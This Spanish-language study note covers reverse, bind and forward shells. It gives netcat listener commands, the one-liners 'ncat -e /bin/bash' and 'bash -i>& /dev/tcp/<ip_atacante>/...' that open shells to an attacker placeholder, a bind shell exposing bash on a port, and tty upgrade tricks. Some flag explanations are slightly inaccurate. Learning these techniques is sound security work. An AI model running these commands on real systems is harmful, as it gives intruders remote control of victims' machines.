___
- tags: #concepts #reverse_shell #bind_shell #forward_shell
___
## Reverse Shell
Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad.

### Máquina atacante en escucha
```bash
nc nlvp 443
```
- -n -> no resolución dns
- -l -> escuchar todos los puertos
- -v -> modo verbose
- -p -> indica el puerto

### Máquina víctima lanza una conexión ofreciendo una bash
```bash
#netcat
ncat -e /bin/bash <ip_atacante> 443

#variate
bash -i>& /dev/tcp/<ip_atacante>/<puerto> 0>&1
```

## Bind Shell
Esta técnica es el opuesto de la **Reverse Shell**, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida.

### Desde la maquina victima expongo un puerto con una bash
```bash
ncat -nlvp 4646 -e /bin/bash
```

### Desde el atacante me conecto a ese puerto
```bash
nc <ip_victima> 4646
```

![[Pasted image 20250828153112.png]]
## Forward Shell
Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO(named pipe)**, que se utiliza como una especie de **'consola simulada'** interactiva a través de la cual el atacante puede operar la máquina remota.
En lugar de establecer una conexión remota el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

### Comandos útiles

#### Obtener una bash
```bash
script /dev/null -c bash
```
#### Obtener una tty
```bash
tty
```

___
## Referencia
- [tty over http - S4vitar](https://github.com/s4vitar/ttyoverhttp).